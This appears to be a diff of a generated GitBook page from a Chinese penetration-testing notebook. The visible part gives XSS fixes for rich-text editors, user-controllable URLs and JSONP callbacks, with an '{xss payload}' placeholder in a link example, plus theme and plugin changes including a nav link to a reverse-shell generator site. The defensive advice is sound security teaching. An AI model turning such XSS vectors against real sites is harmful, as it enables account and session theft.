-<h2 id="&#x7279;&#x6B8A;&#x9632;&#x5FA1;"><a name="&#x7279;&#x6B8A;&#x9632;&#x5FA1;" class="anchor-navigation-ex-anchor" href="#&#x7279;&#x6B8A;&#x9632;&#x5FA1;"><i class="fa fa-link" aria-hidden="true"></i></a>1.8. &#x7279;&#x6B8A;&#x9632;&#x5FA1;</h2>
-<h3 id="&#x5BCC;&#x6587;&#x672C;&#x7F16;&#x8F91;&#x5668;xss&#x4FEE;&#x590D;"><a name="&#x5BCC;&#x6587;&#x672C;&#x7F16;&#x8F91;&#x5668;xss&#x4FEE;&#x590D;" class="anchor-navigation-ex-anchor" href="#&#x5BCC;&#x6587;&#x672C;&#x7F16;&#x8F91;&#x5668;xss&#x4FEE;&#x590D;"><i class="fa fa-link" aria-hidden="true"></i></a>1.8.1. &#x5BCC;&#x6587;&#x672C;&#x7F16;&#x8F91;&#x5668;XSS&#x4FEE;&#x590D;</h3>
+<h2 id="&#x7279;&#x6B8A;&#x9632;&#x5FA1;">&#x7279;&#x6B8A;&#x9632;&#x5FA1;</h2>
+<h3 id="&#x5BCC;&#x6587;&#x672C;&#x7F16;&#x8F91;&#x5668;xss&#x4FEE;&#x590D;">&#x5BCC;&#x6587;&#x672C;&#x7F16;&#x8F91;&#x5668;XSS&#x4FEE;&#x590D;</h3>
 <p>&#x5BCC;&#x6587;&#x672C;&#x7F16;&#x8F91;&#x5668;&#x7684;XSS&#x4E0D;&#x540C;&#x4E8E;&#x5176;&#x4ED6;&#x5730;&#x65B9;&#xFF0C;&#x56E0;&#x4E3A;&#x5B83;&#x672C;&#x8EAB;&#x662F;&#x5141;&#x8BB8;&#x652F;&#x6301;&#x90E8;&#x5206;&#x6807;&#x7B7E;&#x7684;&#xFF0C;&#x4E5F;&#x5C31;&#x662F;&#x8BF4;&#x81F3;&#x5C11;&#x9700;&#x8981;&#x652F;&#x6301;<code>&lt;&gt;</code></p>
 <p>&#x4FEE;&#x590D;&#x5EFA;&#x8BAE;&#x6709;3&#x70B9;&#xFF1A;</p>
 <ol>
 <li>&#x8BBE;&#x7F6E;&#x6807;&#x7B7E;&#x767D;&#x540D;&#x5355;&#xFF0C;&#x5982;&#x4EC5;&#x5141;&#x8BB8;<code><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span><span class="token punctuation">&gt;</span></span></code>&#x3001;<code><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>img</span><span class="token punctuation">&gt;</span></span></code>&#x7B49;&#x5FC5;&#x987B;&#x6807;&#x7B7E;&#x7B49;</li>
 <li>&#x4E3A;&#x767D;&#x540D;&#x5355;&#x6807;&#x7B7E;&#x7684;&#x5C5E;&#x6027;&#x8BBE;&#x7F6E;&#x767D;&#x540D;&#x5355;&#xFF0C;&#x5982;<code><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span><span class="token punctuation">&gt;</span></span></code>&#x4EC5;&#x5141;&#x8BB8;&#x4F7F;&#x7528;<code>href</code>&#x5C5E;&#x6027;&#x7B49;&#xFF0C;&#x540C;&#x65F6;&#x9650;&#x5236;&#x5C5E;&#x6027;&#x4E2D;&#x7684;&#x5185;&#x5BB9;&#x9632;&#x6B62;&#x4F2A;&#x534F;&#x8BAE;&#x9020;&#x6210;XSS&#x6F0F;&#x6D1E;&#xFF0C;&#x7981;&#x6B62;&#x51FA;&#x73B0;<code>on.*</code>&#x7B49;&#x4E8B;&#x4EF6;&#x5C5E;&#x6027;</li>
 </ol>
-<h3 id="url&#x53EF;&#x63A7;"><a name="url&#x53EF;&#x63A7;" class="anchor-navigation-ex-anchor" href="#url&#x53EF;&#x63A7;"><i class="fa fa-link" aria-hidden="true"></i></a>1.8.2. URL&#x53EF;&#x63A7;</h3>
+<h3 id="url&#x53EF;&#x63A7;">URL&#x53EF;&#x63A7;</h3>
 <p>&#x7531;&#x4E8E;&#x67D0;&#x4E9B;&#x5730;&#x65B9;URL&#x53EF;&#x63A7;&#xFF0C;&#x4F7F;&#x7528;<code>javascript</code>&#x7B49;&#x4F2A;&#x534F;&#x8BAE;&#x4ECD;&#x7136;&#x53EF;&#x4EE5;&#x89E6;&#x53D1;XSS&#x6F0F;&#x6D1E;&#xFF0C;&#x5982;</p>
 <pre class="language-"><code class="lang-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>{xss payload}<span class="token punctuation">&quot;</span></span><span class="token punctuation">&gt;</span></span>Test<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">&gt;</span></span>
 </code></pre>
@@ -5554,17 +5474,17 @@ result <span class="token operator">=</span> <span class="token string">&quot;\\
 <li>&#x9A8C;&#x8BC1;URL&#x662F;&#x5426;&#x4EE5;<code>http(s)://</code>&#x5F00;&#x5934;&#xFF0C;&#x5982;&#x679C;&#x4E0D;&#x662F;&#x5219;&#x81EA;&#x52A8;&#x6DFB;&#x52A0;&#x6216;&#x62D2;&#x7EDD;&#x8BF7;&#x6C42;&#xFF0C;&#x786E;&#x4FDD;&#x4E0D;&#x4F1A;&#x51FA;&#x73B0;&#x4F2A;&#x534F;&#x8BAE;</li>
 <li>&#x5BF9;<code>http(s)://</code>&#x540E;&#x7684;&#x5185;&#x5BB9;&#x8FDB;&#x884C;URL&#x7F16;&#x7801;&#x5904;&#x7406;</li>
 </ol>
-<h3 id="jsonp"><a name="jsonp" class="anchor-navigation-ex-anchor" href="#jsonp"><i class="fa fa-link" aria-hidden="true"></i></a>1.8.3. JSONP</h3>
+<h3 id="jsonp">JSONP</h3>
 <p>&#x90E8;&#x5206;&#x7F51;&#x7AD9;&#x7531;&#x4E8E;&#x8DE8;&#x57DF;&#x8C03;&#x7528;&#x4E2D;<code>callback</code>&#x51FD;&#x6570;&#x540D;&#x53EF;&#x4EE5;&#x81EA;&#x5B9A;&#x4E49;&#xFF0C;&#x53EF;&#x4EE5;&#x5C06;&#x56DE;&#x8C03;&#x51FD;&#x6570;&#x540D;&#x4FEE;&#x6539;&#x4E3A;XSS&#x8BED;&#x53E5;&#x5BFC;&#x81F4;XSS&#x6F0F;&#x6D1E;</p>
 <p>&#x4FEE;&#x590D;&#x4E5F;&#x5F88;&#x7B80;&#x5355;&#xFF0C;&#x8BBE;&#x7F6E;&#x8FD4;&#x56DE;&#x7684;header&#x5934;&#x5373;&#x53EF;&#xFF0C;&#x5982;&#x4E0B;</p>
 <pre class="language-"><code class="lang-properties"><span class="token attr-name">Content-Type</span><span class="token punctuation">:</span> <span class="token attr-value">application/json; charset=utf-8</span>
 </code></pre>
 <footer class="page-footer"><span class="copyright">Copyright &#xA9; d4m1ts 2023 all right reserved&#xFF0C;powered by Gitbook</span><span class="footer-modification">&#x8BE5;&#x6587;&#x7AE0;&#x4FEE;&#x8BA2;&#x65F6;&#x95F4;&#xFF1A;
 2022-11-24 20:53:41
-</span></footer></body></html>
-                                
-                                </section>
-                            
+</span></footer>
+                        
+                    </section>
+                    
     </div>
     <div class="search-results">
         <div class="has-results">
@@ -5581,30 +5501,29 @@ result <span class="token operator">=</span> <span class="token string">&quot;\\
     </div>
 </div>
 
-                        </div>
-                    </div>
-                
+                </div>
             </div>
+            
+        </div>
 
-            
-                
-                <a href="../01.SQL注入/09.工具Sqlmap/tamper.html" class="navigation navigation-prev " aria-label="Previous page: Tamper">
-                    <i class="fa fa-angle-left"></i>
-                </a>
-                
-                
-                <a href="postmessage xss.html" class="navigation navigation-next " aria-label="Next page: Postmessage Xss">
-                    <i class="fa fa-angle-right"></i>
-                </a>
-                
-            
+        
+        
+        <a href="../01.SQL注入/09.工具Sqlmap/tamper.html" class="navigation navigation-prev " aria-label="Previous page: Tamper">
+            <i class="fa fa-angle-left"></i>
+        </a>
+        
+        
+        <a href="postmessage xss.html" class="navigation navigation-next " aria-label="Next page: Postmessage Xss">
+            <i class="fa fa-angle-right"></i>
+        </a>
+        
+        
         
     </div>
-
     <script>
         var gitbook = gitbook || [];
         gitbook.push(function() {
-            gitbook.page.hasChanged({"page":{"title":"02.XSS","level":"1.2.2.2","depth":3,"next":{"title":"Postmessage Xss","level":"1.2.2.2.1","depth":4,"path":"个人知识库/01.渗透测试/02.WEB漏洞/02.XSS/postmessage xss.md","ref":"个人知识库/01.渗透测试/02.WEB漏洞/02.XSS/postmessage xss.md","articles":[]},"previous":{"title":"Tamper","level":"1.2.2.1.9.1","depth":5,"path":"个人知识库/01.渗透测试/02.WEB漏洞/01.SQL注入/09.工具Sqlmap/tamper.md","ref":"个人知识库/01.渗透测试/02.WEB漏洞/01.SQL注入/09.工具Sqlmap/tamper.md","articles":[]},"dir":"ltr"},"config":{"plugins":["-lunr","-search","search-plus","-highlight","chapter-fold","expandable-chapters","splitter","page-treeview","lightbox","donate","hide-element","code","tbfed-pagefooter","pageview-count","ancre-navigation","anchor-navigation-ex","insert-logo","favicon","github","flexible-alerts","prism","auto-scroll-table","d4test","livereload"],"styles":{"website":"styles/website.css","pdf":"styles/pdf.css","epub":"styles/epub.css","mobi":"styles/mobi.css","ebook":"styles/ebook.css","print":"styles/print.css"},"pluginsConfig":{"tbfed-pagefooter":{"copyright":"Copyright &copy d4m1ts 2023","modify_label":"该文章修订时间：","modify_format":"YYYY-MM-DD HH:mm:ss"},"page-treeview":{"collapsed":false,"copyright":"Copyright &#169; d4m1ts","minHeaderCount":"2","minHeaderDeep":"2"},"chapter-fold":{},"prism":{"css":["prismjs/themes/prism-tomorrow.css"],"lang":{"flow":"typescript"},"ignore":["mermaid","eval-js","ascii","result","manifest","payload","google","tree","java_out","log4j2","jsp","class","Exception","stack","c#","xml-dtd","C++","twig","jinja2","exception","tpl"]},"d4test":{},"github":{"url":"https://github.com/damit5"},"livereload":{},"splitter":{},"auto-scroll-table":{},"code":{"copyButtons":true},"donate":{"alipay":"/README.assets/gzh_1.png","alipayText":"点点广告🙏","button":"支持作者","title":"","wechat":"/README.assets/gzh_0.png","wechatText":"关闭Adblock"},"hide-element":{"elements":[".gitbook-link",".treeview__copyright",".treeview__main-title"]},"fontsettings":{"theme":"white","family":"sans","size":2},"anchor-navigation-ex":{"associatedWithSummary":true,"float":{"floatIcon":"fa fa-navicon","level1Icon":"","level2Icon":"","level3Icon":"","showLevelIcon":false},"mode":"float","multipleH1":true,"pageTop":{"level1Icon":"","level2Icon":"","level3Icon":"","showLevelIcon":false},"printLog":false,"showGoTop":true,"showLevel":true},"favicon":{"shortcut":"/README.assets/favicon.ico","bookmark":"/README.assets/favicon.ico","appleTouch":"/README.assets/favicon.ico","appleTouchMore":{"120x120":"/README.assets/favicon.ico","180x180":"/README.assets/favicon.ico"}},"lightbox":{"jquery":true,"sameUuid":false},"pageview-count":{},"ancre-navigation":{"associatedWithSummary":true,"float":{"level1Icon":"","level2Icon":"","level3Icon":"","showLevelIcon":false},"mode":"float","multipleH1":true,"pageTop":{"level1Icon":"","level2Icon":"","level3Icon":"","showLevelIcon":false},"printLog":false,"showLevel":true},"flexible-alerts":{"danger":{"className":"danger","icon":"fa fa-ban","label":"Attention"},"note":{"className":"info","icon":"fa fa-info-circle","label":"Note"},"style":"callout","tip":{"className":"tip","icon":"fa fa-lightbulb-o","label":"Tip"},"warning":{"className":"warning","icon":"fa fa-exclamation-triangle","label":"Warning"},"comment":{"label":"Comment","icon":"fa fa-comments","className":"info"}},"sharing":{"facebook":true,"twitter":true,"google":false,"weibo":false,"instapaper":false,"vk":false,"all":["facebook","google","twitter","weibo","instapaper"]},"theme-default":{"styles":{"website":"styles/website.css","pdf":"styles/pdf.css","epub":"styles/epub.css","mobi":"styles/mobi.css","ebook":"styles/ebook.css","print":"styles/print.css"},"showLevel":false},"insert-logo":{"style":"background: none; max-height: 40px; min-height: 40px","url":"/README.assets/logo.png"},"expandable-chapters":{},"search-plus":{}},"theme":"default","author":"d4m1ts","pdf":{"pageNumbers":true,"fontSize":12,"fontFamily":"Arial","paperSize":"a4","chapterMark":"pagebreak","pageBreaksBefore":"/","margin":{"right":62,"left":62,"top":56,"bottom":56}},"structure":{"langs":"LANGS.md","readme":"README.md","glossary":"GLOSSARY.md","summary":"SUMMARY.md"},"variables":{},"title":"d4m1ts 知识库","gitbook":"*","description":"个人的部分知识技能，倾向于使用知识库的方式进行总结回顾自己","theme-default":{"showLevel":true}},"file":{"path":"个人知识库/01.渗透测试/02.WEB漏洞/02.XSS/README.md","mtime":"2022-11-24T12:53:41.441Z","type":"markdown"},"gitbook":{"version":"3.2.3","time":"2023-05-30T05:54:54.906Z"},"basePath":"../../../..","book":{"language":""}});
+            gitbook.page.hasChanged({"page":{"title":"02.XSS","level":"1.2.2.2","depth":3,"next":{"title":"Postmessage Xss","level":"1.2.2.2.1","depth":4,"path":"个人知识库/01.渗透测试/02.WEB漏洞/02.XSS/postmessage xss.md","ref":"个人知识库/01.渗透测试/02.WEB漏洞/02.XSS/postmessage xss.md","articles":[]},"previous":{"title":"Tamper","level":"1.2.2.1.9.1","depth":5,"path":"个人知识库/01.渗透测试/02.WEB漏洞/01.SQL注入/09.工具Sqlmap/tamper.md","ref":"个人知识库/01.渗透测试/02.WEB漏洞/01.SQL注入/09.工具Sqlmap/tamper.md","articles":[]},"dir":"ltr"},"config":{"plugins":["splitter","hide-element","code","theme-d4t","-lunr","-search","-sharing","search-pro-fixed","-highlight","chapter-fold","expandable-chapters","lightbox","donate","tbfed-pagefooter","github","flexible-alerts","prism","back-to-top-button","auto-scroll-table","d4test","livereload"],"styles":{"website":"styles/website.css","pdf":"styles/pdf.css","epub":"styles/epub.css","mobi":"styles/mobi.css","ebook":"styles/ebook.css","print":"styles/print.css"},"pluginsConfig":{"theme-d4t":{},"tbfed-pagefooter":{"copyright":"Copyright &copy d4m1ts 2023","modify_label":"该文章修订时间：","modify_format":"YYYY-MM-DD HH:mm:ss"},"chapter-fold":{},"prism":{"css":["prismjs/themes/prism-tomorrow.css"],"lang":{"flow":"typescript"},"ignore":["mermaid","eval-js","ascii","result","manifest","payload","google","tree","java_out","log4j2","jsp","class","Exception","stack","c#","xml-dtd","C++","twig","jinja2","exception","tpl"]},"d4test":{},"github":{"url":"https://github.com/damit5"},"d4t":{"search-placeholder":"请输入关键字搜索","logo":"/README.assets/logo.svg","favicon":"/README.assets/favicon.ico"},"livereload":{},"splitter":{},"auto-scroll-table":{},"code":{"copyButtons":true},"search-pro-fixed":{},"donate":{"alipay":"/README.assets/gzh_1.png","alipayText":"点点广告🙏","button":"支持作者","title":"","wechat":"/README.assets/gzh_0.png","wechatText":"关闭Adblock"},"hide-element":{"elements":[".gitbook-link",".treeview__copyright",".treeview__main-title"]},"fontsettings":{"theme":"white","family":"sans","size":2},"lightbox":{"jquery":true,"sameUuid":false},"back-to-top-button":{},"flexible-alerts":{"danger":{"className":"danger","icon":"fa fa-ban","label":"Attention"},"note":{"className":"info","icon":"fa fa-info-circle","label":"Note"},"style":"callout","tip":{"className":"tip","icon":"fa fa-lightbulb-o","label":"Tip"},"warning":{"className":"warning","icon":"fa fa-exclamation-triangle","label":"Warning"},"comment":{"label":"Comment","icon":"fa fa-comments","className":"info"}},"theme-default":{"styles":{"website":"styles/website.css","pdf":"styles/pdf.css","epub":"styles/epub.css","mobi":"styles/mobi.css","ebook":"styles/ebook.css","print":"styles/print.css"},"showLevel":false},"expandable-chapters":{}},"theme":"default","author":"d4m1ts","pdf":{"pageNumbers":true,"fontSize":12,"fontFamily":"Arial","paperSize":"a4","chapterMark":"pagebreak","pageBreaksBefore":"/","margin":{"right":62,"left":62,"top":56,"bottom":56}},"structure":{"langs":"LANGS.md","readme":"README.md","glossary":"GLOSSARY.md","summary":"SUMMARY.md"},"variables":{"d4t":{"nav":[{"url":"https://markdown.gm7.org/","target":"_blank","name":"markdown在线"},{"url":"https://rshell.gm7.org/","target":"_blank","name":"Reverse Shell Generator"}]}},"title":"","gitbook":"*","description":"个人的部分知识技能，倾向于使用知识库的方式进行总结回顾自己","theme-default":{"showLevel":true}},"file":{"path":"个人知识库/01.渗透测试/02.WEB漏洞/02.XSS/README.md","mtime":"2022-11-24T12:53:41.441Z","type":"markdown"},"gitbook":{"version":"3.2.3","time":"2023-05-31T10:06:32.950Z"},"basePath":"../../../..","book":{"language":""}});
         });
     </script>
 </div>
@@ -5614,31 +5533,7 @@ result <span class="token operator">=</span> <span class="token string">&quot;\\
     <script src="../../../../gitbook/theme.js"></script>
     
         
-        <script src="../../../../gitbook/gitbook-plugin-search-plus/jquery.mark.min.js"></script>
-        
-    
-        
-        <script src="../../../../gitbook/gitbook-plugin-search-plus/search.js"></script>
-        
-    
-        
-        <script src="../../../../gitbook/gitbook-plugin-chapter-fold/chapter-fold.js"></script>
-        
-    
-        
-        <script src="../../../../gitbook/gitbook-plugin-expandable-chapters/expandable-chapters.js"></script>
-        
-    
-        
         <script src="../../../../gitbook/gitbook-plugin-splitter/splitter.js"></script>
-        
-    
-        
-        <script src="../../../../gitbook/gitbook-plugin-lightbox/js/lightbox.min.js"></script>
-        
-    
-        
-        <script src="../../../../gitbook/gitbook-plugin-donate/plugin.js"></script>
         
     
         
@@ -5650,11 +5545,27 @@ result <span class="token operator">=</span> <span class="token string">&quot;\\
         
     
         
-        <script src="../../../../gitbook/gitbook-plugin-pageview-count/plugin.js"></script>
+        <script src="../../../../gitbook/gitbook-plugin-search-pro-fixed/jquery.mark.min.js"></script>
         
     
         
-        <script src="../../../../gitbook/gitbook-plugin-insert-logo/plugin.js"></script>
+        <script src="../../../../gitbook/gitbook-plugin-search-pro-fixed/search.js"></script>
+        
+    
+        
+        <script src="../../../../gitbook/gitbook-plugin-chapter-fold/chapter-fold.js"></script>
+        
+    
+        
+        <script src="../../../../gitbook/gitbook-plugin-expandable-chapters/expandable-chapters.js"></script>
+        
+    
+        
+        <script src="../../../../gitbook/gitbook-plugin-lightbox/js/lightbox.min.js"></script>
+        
+    
+        
+        <script src="../../../../gitbook/gitbook-plugin-donate/plugin.js"></script>
         
     
         
@@ -5663,6 +5574,10 @@ result <span class="token operator">=</span> <span class="token string">&quot;\\
     
         
         <script src="../../../../gitbook/gitbook-plugin-flexible-alerts/plugin.js"></script>
+        
+    
+        
+        <script src="../../../../gitbook/gitbook-plugin-back-to-top-button/plugin.js"></script>
         
     
         
@@ -5686,11 +5601,11 @@ result <span class="token operator">=</span> <span class="token string">&quot;\\
         
     
         
-        <script src="../../../../gitbook/gitbook-plugin-sharing/buttons.js"></script>
+        <script src="../../../../gitbook/gitbook-plugin-fontsettings/fontsettings.js"></script>
         
     
         
-        <script src="../../../../gitbook/gitbook-plugin-fontsettings/fontsettings.js"></script>
+        <script src="../../../../gitbook/gitbook-plugin-theme-d4t/script.js"></script>
         
     
 
